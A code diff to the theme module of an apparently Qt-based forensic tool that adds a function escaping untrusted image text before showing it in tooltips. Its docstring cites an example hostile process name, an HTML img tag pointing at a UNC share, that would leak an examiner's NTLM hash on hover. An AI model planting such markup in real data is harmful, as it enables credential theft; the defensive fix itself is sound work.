@@ -20,6 +20,7 @@ so an inline colour is a permanent theme override that no palette can reach.
 
 from __future__ import annotations
 
+import html
 import re
 from string import Template
 
@@ -809,6 +810,24 @@ def palette(dark: bool = True) -> dict:
     return dict(DARK if dark else LIGHT)
 
 
+def plain(text, limit: int = 2000) -> str:
+    """
+    Text from the image, made safe for a tooltip.
+
+    Qt renders a tooltip as HTML whenever the string looks like markup, so a
+    process named ``<img src="\\\\host\\share\\x.png">`` would make Qt fetch
+    that file on hover, which on Windows sends the examiner's NTLM hash to
+    the attacker. Escaped and wrapped, it always shows as literal text. It is
+    also cut at `limit`: a megabyte tooltip freezes the window laying it out.
+    """
+    if not text:
+        return ""
+    text = str(text)
+    if len(text) > limit:
+        text = text[:limit] + "…"
+    return f"<p style='white-space:pre-wrap'>{html.escape(text)}</p>"
+
+
 def _luminance(hex_color: str) -> float:
     channels = [int(hex_color[i:i + 2], 16) / 255 for i in (1, 3, 5)]
     r, g, b = (c / 12.92 if c <= 0.03928 else ((c + 0.055) / 1.055) ** 2.4 for c in channels)
@@ -845,7 +864,3 @@ def restyle(widget) -> None:
     style.polish(widget)
     widget.update()
 
-
-# Kept so existing imports keep working; both are now generated from one source.
-DARK_THEME = build(dark=True)
-LIGHT_THEME = build(dark=False)
